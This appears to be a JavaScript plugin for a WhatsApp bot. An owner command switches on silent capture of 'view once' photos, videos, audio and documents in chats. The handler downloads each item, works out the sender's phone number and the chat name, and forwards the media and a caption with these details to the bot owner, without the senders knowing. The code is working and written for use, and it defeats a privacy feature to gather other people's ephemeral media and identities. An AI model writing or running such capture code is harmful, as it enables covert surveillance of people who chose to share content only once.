import { getViewOnceMediaFromMessage, getViewOnceMediaFromOwnMessage, downloadViewOnceMedia } from '../lib/viewonce.js'

const ownerLids = new Set(['114864672526580'])
const botLids = new Set(['29107664511194'])
const handledProtocolMessages = new Set()
const pendingViewOnceMedia = new Set()

const getOwnerNumbers = () => new Set((global.owner || []).map((number) => String(number).replace(/\D/g, '')).filter(Boolean))

export const formatViewOnceCaption = (mentionJid, chatName, timestamp) => {
  const numericTimestamp = Number(timestamp)
  const messageDate = new Date(Number.isFinite(numericTimestamp) && numericTimestamp > 0
    ? (numericTimestamp < 1e12 ? numericTimestamp * 1000 : numericTimestamp)
    : Date.now())
  const tag = mentionJid ? `@${mentionJid.split('@')[0]}` : '@desconocido'
  return `Tag: ${tag}\nChat: ${String(chatName || 'Chat privado').trim()}\nFecha: ${messageDate.toLocaleString('es-AR')}`
}

const getBotSettings = (conn) => {
  const settings = global.db.data.settings || (global.db.data.settings = {})
  const botJid = conn.user?.jid || conn.user?.id
  if (!botJid) return {}
  if (!settings[botJid] || typeof settings[botJid] !== 'object') settings[botJid] = {}
  return settings[botJid]
}

export const getViewOnceMediaKey = (sourceMessage, protocolKey) => {
  const remoteJid = String(sourceMessage?.key?.remoteJid || sourceMessage?.chat || protocolKey?.remoteJid || '')
    .replace(/:\d+(?=@)/, '')
    .toLowerCase()
  const messageId = sourceMessage?.key?.id || protocolKey?.id
  return remoteJid && messageId ? `${remoteJid}:${messageId}` : null
}

export const hasAlreadySentViewOnce = (conn, mediaKey) => {
  if (!mediaKey) return false
  const sent = getBotSettings(conn).captureViewOnceSent
  return Array.isArray(sent) && sent.includes(mediaKey)
}

export const rememberSentViewOnce = async (conn, mediaKey) => {
  if (!mediaKey) return
  const settings = getBotSettings(conn)
  const sent = Array.isArray(settings.captureViewOnceSent) ? settings.captureViewOnceSent : []
  settings.captureViewOnceSent = [...new Set([...sent, mediaKey])].slice(-1000)
  await global.db.write()
}

export const getQuotedViewOnceSource = (m) => {
  const quotedContext = [
    m?.msg,
    ...Object.values(m?.message || {}),
    ...Object.values(m?.msg || {}),
    m?.quoted?.msg,
    m?.quoted,
  ].map((content) => content?.contextInfo).find((context) => context?.quotedMessage && context?.stanzaId)
  const quotedMessage = quotedContext?.quotedMessage || m?.quoted?.vM?.message || m?.quoted?.message || m?.quoted?.mediaMessage
  const messageId = quotedContext?.stanzaId || m?.quoted?.id || m?.quoted?.key?.id
  if (!quotedMessage || !messageId) return null
  const media = getViewOnceMediaFromMessage(quotedMessage)
  if (!media) return null
  const sender = quotedContext?.participant || m?.quoted?.sender || m?.quoted?.key?.participant || m.sender
  return {
    media,
    sourceMessage: {
      key: { id: messageId, remoteJid: m.chat, participant: sender },
      chat: m.chat,
      sender,
      messageTimestamp: m?.quoted?.messageTimestamp || m?.quoted?.timestamp,
      message: quotedMessage,
    },
  }
}

export const resolveOwnerJids = async () => {
  const jids = new Set()
  for (const number of global.owner || []) {
    const normalized = String(number).replace(/\D/g, '')
    if (!normalized) continue
    jids.add(`${normalized}@s.whatsapp.net`)
  }
  if (!jids.size) {
    for (const lid of global.ownerLids || []) {
      const normalized = String(lid || '').replace(/\D/g, '')
      if (normalized) jids.add(`${normalized}@lid`)
    }
  }
  return [...jids]
}

export const sendToOwner = async (conn, destination, payload, options) => {
  try {
    return await conn.sendMessage(destination, payload, options)
  } catch (initialError) {
    const ownerLidJids = [...new Set([
      ...ownerLids,
      ...((global.ownerLids || []).map((lid) => String(lid).replace(/\D/g, ''))),
    ])].filter(Boolean).map((lid) => `${lid}@lid`)
    for (const ownerLid of ownerLidJids) {
      if (ownerLid === destination) continue
      try {
        return await conn.sendMessage(ownerLid, payload, options)
      } catch {}
    }
    throw initialError
  }
}

const getCachedOriginalMessage = async (conn, protocolKey) => {
  if (!protocolKey?.id) return null
  const cache = global.__antideleteMessages
  const cachedCandidates = [
    cache?.get(`${protocolKey.remoteJid || ''}:${protocolKey.id}`),
    cache?.get(protocolKey.id),
  ]
  const matchesProtocolKey = (candidate) => {
    if (candidate?.key?.id !== protocolKey.id) return false
    const cachedChat = String(candidate.key.remoteJid || candidate.chat || '')
    const protocolChat = String(protocolKey.remoteJid || '')
    return !cachedChat || !protocolChat || cachedChat.replace(/:\d+(?=@)/, '').toLowerCase() === protocolChat.replace(/:\d+(?=@)/, '').toLowerCase()
  }
  const cached = cachedCandidates.find(matchesProtocolKey)
  if (cached) return cached
  if (typeof conn.loadMessage !== 'function') return null
  try {
    const original = await conn.loadMessage(protocolKey.id)
    return matchesProtocolKey(original) ? original : null
  } catch (error) {
    console.warn(`[VIEW-ONCE] No se pudo recuperar el mensaje original ${protocolKey.id}:`, error?.message || error)
    return null
  }
}

const resolveGroupMetadata = async (conn, groupJid) => {
  if (!groupJid?.endsWith('@g.us') || typeof conn.groupMetadata !== 'function') return null
  try {
    return await conn.groupMetadata(groupJid)
  } catch (error) {
    console.warn(`[VIEW-ONCE] No se pudo resolver el grupo ${groupJid}:`, error?.message || error)
    return null
  }
}

const resolvePhoneNumber = async (conn, sourceMessage, protocolKey, groupMetadata) => {
  const groupCandidates = (groupMetadata?.participants || []).filter((participant) => {
    const messageSender = [
      sourceMessage?.key?.participant,
      sourceMessage?.sender,
      sourceMessage?.participant,
      protocolKey?.participant,
    ].filter(Boolean).map((jid) => String(jid).replace(/:\d+/g, '').toLowerCase())
    const participantIds = [participant?.id, participant?.jid, participant?.lid]
      .filter(Boolean)
      .map((jid) => String(jid).replace(/:\d+/g, '').toLowerCase())
    return participantIds.some((jid) => messageSender.includes(jid))
  })
  const candidates = [
    ...groupCandidates.flatMap((participant) => [participant?.phoneNumber, participant?.jid, participant?.id]),
    sourceMessage?.key?.senderPn,
    sourceMessage?.key?.remoteJidAlt,
    sourceMessage?.key?.participant,
    sourceMessage?.sender,
    sourceMessage?.participant,
    protocolKey?.participant,
    sourceMessage?.key?.remoteJid?.endsWith('@g.us') ? null : sourceMessage?.key?.remoteJid,
    protocolKey?.remoteJid?.endsWith('@g.us') ? null : protocolKey?.remoteJid,
  ].filter(Boolean)

  for (const candidate of candidates) {
    let jid = conn.decodeJid?.(String(candidate)) || String(candidate)
    if (jid.endsWith('@lid')) {
      try {
        jid = await conn.signalRepository?.lidMapping?.getPNForLID?.(jid) || jid
      } catch (error) {
        console.warn('[VIEW-ONCE] No se pudo resolver el número del remitente:', error?.message || error)
      }
    }
    const number = String(jid).split('@')[0].replace(/\D/g, '')
    if (number.length >= 7) return `+${number}`
  }
  return 'Número no disponible'
}

const resolveMentionJid = async (conn, sourceMessage, protocolKey, groupMetadata, senderNumber) => {
  const senderIds = [
    sourceMessage?.key?.participant,
    sourceMessage?.sender,
    sourceMessage?.participant,
    protocolKey?.participant,
  ].filter(Boolean).map((jid) => String(jid).replace(/:\d+/g, '').toLowerCase())
  const groupCandidates = (groupMetadata?.participants || []).filter((participant) =>
    [participant?.id, participant?.jid, participant?.lid]
      .filter(Boolean)
      .some((jid) => senderIds.includes(String(jid).replace(/:\d+/g, '').toLowerCase()))
  )
  const candidates = [
    ...groupCandidates.flatMap((participant) => [participant?.phoneNumber, participant?.jid, participant?.id, participant?.lid]),
    sourceMessage?.key?.senderPn,
    sourceMessage?.key?.remoteJidAlt,
    sourceMessage?.key?.participant,
    sourceMessage?.sender,
    sourceMessage?.participant,
    protocolKey?.participant,
    sourceMessage?.key?.remoteJid?.endsWith('@g.us') ? null : sourceMessage?.key?.remoteJid,
    protocolKey?.remoteJid?.endsWith('@g.us') ? null : protocolKey?.remoteJid,
  ].filter(Boolean)
  let lidFallback = null
  for (const candidate of candidates) {
    let jid = conn.decodeJid?.(String(candidate)) || String(candidate)
    if (jid.endsWith('@lid')) {
      lidFallback ||= jid
      try {
        const phoneJid = await conn.signalRepository?.lidMapping?.getPNForLID?.(jid)
        if (typeof phoneJid === 'string' && phoneJid) jid = phoneJid
      } catch (error) {
        console.warn('[VIEW-ONCE] No se pudo resolver la mención del remitente:', error?.message || error)
      }
    }
    if (jid.endsWith('@s.whatsapp.net') || jid.endsWith('@c.us')) return jid
  }
  const digits = senderNumber.replace(/\D/g, '')
  return lidFallback || (digits.length >= 7 ? `${digits}@s.whatsapp.net` : null)
}

const isConfiguredOwner = async (conn, m, isROwner, isOwner) => {
  if (isROwner || isOwner || m.fromMe) return true
  const ownerNumbers = getOwnerNumbers()
  const configuredOwnerLids = new Set([
    ...ownerLids,
    ...((global.ownerLids || []).map((lid) => String(lid).replace(/\D/g, ''))),
    ...botLids,
  ])
  const candidates = [m.sender, m.key?.participant, m.key?.senderPn, m.key?.remoteJidAlt]
  const candidateNumbers = candidates.map((jid) => String(jid || '').replace(/\D/g, ''))
  if (candidateNumbers.some((number) => ownerNumbers.has(number) || configuredOwnerLids.has(number))) return true
  const botJids = [conn.user?.id, conn.user?.jid, conn.user?.lid]
  if (candidates.some((jid) => botJids.includes(jid))) return true
  if (typeof conn.onWhatsApp !== 'function') return false
  const resolved = await conn.onWhatsApp(m.sender).catch(() => [])
  return resolved.some(({ jid }) => ownerNumbers.has(String(jid || '').replace(/\D/g, '')))
}

const handler = async (m, { conn, text, command, isROwner, isOwner, chat }) => {
  const commandValue = (command || '').trim().toLowerCase()
  const textValue = (text || '').trim().toLowerCase()
  const isOnOffUnavez = ['on', 'off'].includes(commandValue) && ['unavez', 'viewonce', 'view once'].includes(textValue)
  if (commandValue !== 'activarunavez' && !isOnOffUnavez) return
  const antiDeleteTargets = ['antidelete', 'antideleteprivate', 'antideleteprivado', 'antidelete private', 'antidelete privado']
  if ((commandValue === 'on' || commandValue === 'off') && antiDeleteTargets.includes(textValue)) return
  if (commandValue === 'on' && textValue === 'aternos') return
  if (!await isConfiguredOwner(conn, m, isROwner, isOwner)) return conn.reply(m.chat, 'Solo el dueño puede usar este comando.', m)

  const value = isOnOffUnavez ? commandValue : commandValue === 'on' && textValue === 'noveruna' ? 'on noveruna' : textValue
  const targetChat = chat || global.db.data.chats[m.chat] || (global.db.data.chats[m.chat] = {})
  const destination = /^(destino|destination)\s+(bot|owner)$/.exec(value)
  if (destination) return conn.reply(m.chat, 'Las imágenes de una sola vez capturadas se envían al owner.', m)
  if (!['on noveruna', 'on', 'off', 'enable', 'disable', 'activar', 'desactivar'].includes(value)) {
    const status = targetChat.captureViewOnce ? 'activado' : 'desactivado'
    return conn.reply(m.chat, `Uso: activarunavez on/off o on/off unavez\nEstado actual: ${status}\nLas imágenes capturadas se envían al owner.`, m)
  }

  const enabled = value === 'on noveruna' || ['on', 'enable', 'activar'].includes(value)
  console.log(`[VIEW-ONCE] Comando recibido command=${commandValue} text=${textValue} enabled=${enabled} chat=${m.chat}`)
  targetChat.captureViewOnce = enabled
  await global.db.write()
  return conn.reply(m.chat, `Captura de mensajes de una sola vez: ${enabled ? 'activada' : 'desactivada'}.`, m)
}

handler.all = async function (m, { chat }) {
  const conn = this
  const protocolMessage = m.message?.protocolMessage || (m.mtype === 'protocolMessage' ? m.msg : null)
  const protocolKey = protocolMessage?.key || null
  if (!chat?.captureViewOnce) return
  if (protocolKey?.fromMe) return
  const protocolCacheKey = protocolKey?.id
    ? `${String(protocolKey.remoteJid || '').replace(/:\d+(?=@)/, '').toLowerCase()}:${protocolKey.id}`
    : null
  if (protocolCacheKey && handledProtocolMessages.has(protocolCacheKey)) return
  const quotedViewOnceSource = !protocolMessage ? getQuotedViewOnceSource(m) : null
  if (m.fromMe && !quotedViewOnceSource) return
  const quotedViewOnce = quotedViewOnceSource?.media || null
  const sourceMessage = protocolKey?.id
    ? await getCachedOriginalMessage(conn, protocolKey) || m
    : quotedViewOnceSource
      ? quotedViewOnceSource.sourceMessage
      : m
  const media = protocolMessage
    ? getViewOnceMediaFromMessage(sourceMessage) || getViewOnceMediaFromMessage(m)
    : quotedViewOnce || getViewOnceMediaFromOwnMessage(m.message || m.msg || m)
  if (!media) return
  const mediaKey = getViewOnceMediaKey(sourceMessage, protocolKey)
  if (hasAlreadySentViewOnce(conn, mediaKey) || (mediaKey && pendingViewOnceMedia.has(mediaKey))) return
  if (mediaKey) pendingViewOnceMedia.add(mediaKey)
  const sourceChat = String(sourceMessage?.key?.remoteJid || sourceMessage?.chat || m.chat || '')
  const isGroupViewOnce = sourceChat.endsWith('@g.us')
  const groupMetadata = isGroupViewOnce ? await resolveGroupMetadata(conn, sourceChat) : null
  const identityMessage = protocolMessage ? m : sourceMessage
  const identityKey = protocolMessage ? m.key : protocolKey
  const senderNumber = await resolvePhoneNumber(conn, identityMessage, identityKey, groupMetadata)
  const mentionJid = await resolveMentionJid(conn, identityMessage, identityKey, groupMetadata, senderNumber)
  let chatName = groupMetadata?.subject
  if (!isGroupViewOnce && typeof conn.getName === 'function') {
    try {
      chatName = await conn.getName(sourceChat)
    } catch (error) {
      console.warn(`[VIEW-ONCE] No se pudo resolver el nombre del chat ${sourceChat}:`, error?.message || error)
    }
  }
  chatName = String(chatName || identityMessage?.pushName || sourceChat.split('@')[0] || 'Chat privado').trim()
  const destinations = await resolveOwnerJids()
  console.log(`[VIEW-ONCE] Media detectada type=${media.type} destinos=${destinations.join(',') || 'ninguno'}`)
  if (!destinations.length) {
    console.error('[VIEW-ONCE] No se pudo resolver ningún propietario en WhatsApp')
    if (mediaKey) pendingViewOnceMedia.delete(mediaKey)
    return
  }

  try {
    const buffer = await downloadViewOnceMedia(media.media, media.type)
    console.log(`[VIEW-ONCE] Descarga directa bytes=${buffer.length}`)
    const timestamp = Number((protocolMessage ? m : sourceMessage)?.messageTimestamp)
    const caption = formatViewOnceCaption(mentionJid, chatName, timestamp)
    for (const destination of destinations) {
      if (media.type === 'imageMessage') {
        await sendToOwner(conn, destination, { image: buffer, caption, mentions: mentionJid ? [mentionJid] : [] }, { ephemeralExpiration: 0 })
      } else if (media.type === 'audioMessage') {
        await sendToOwner(conn, destination, { audio: buffer, mimetype: media.media.mimetype || 'audio/ogg; codecs=opus', ptt: media.media.ptt || false }, { ephemeralExpiration: 0 })
      } else if (media.type === 'videoMessage') {
        await sendToOwner(conn, destination, { video: buffer, caption, mentions: mentionJid ? [mentionJid] : [], mimetype: media.media.mimetype || 'video/mp4' }, { ephemeralExpiration: 0 })
      } else {
        await sendToOwner(conn, destination, { document: buffer, fileName: media.media.fileName || 'view-once', mimetype: media.media.mimetype || 'application/octet-stream', caption, mentions: mentionJid ? [mentionJid] : [] }, { ephemeralExpiration: 0 })
      }
      console.log(`[VIEW-ONCE] Envío completado destino=${destination}`)
    }
    await rememberSentViewOnce(conn, mediaKey)
    if (protocolCacheKey) {
      handledProtocolMessages.add(protocolCacheKey)
      if (handledProtocolMessages.size > 100) handledProtocolMessages.delete(handledProtocolMessages.values().next().value)
      console.log(`[VIEW-ONCE] Mensaje protocolo procesado id=${protocolKey.id} remote=${protocolKey.remoteJid || ''}`)
    }
  } catch (error) {
    console.error(`[VIEW-ONCE] ERROR chat=${sourceChat} sender=${senderNumber} type=${media.type} destinos=${destinations.join(',')}`)
    console.error(error?.stack || error)
    for (const destination of destinations) await conn.sendMessage(destination, { text: `Error capturando view once\nChat: ${sourceChat}\nRemitente: ${senderNumber}\n${error.stack || error.message}` }).catch((sendError) => console.error(`[VIEW-ONCE] No se pudo enviar el detalle a ${destination}:`, sendError?.stack || sendError))
  } finally {
    if (mediaKey) pendingViewOnceMedia.delete(mediaKey)
  }
}

handler.help = ['on unavez', 'off unavez', 'activarunavez on/off']
handler.tags = ['owner']
handler.command = ['activarunavez', /^on$/, /^off$/]

export default handler
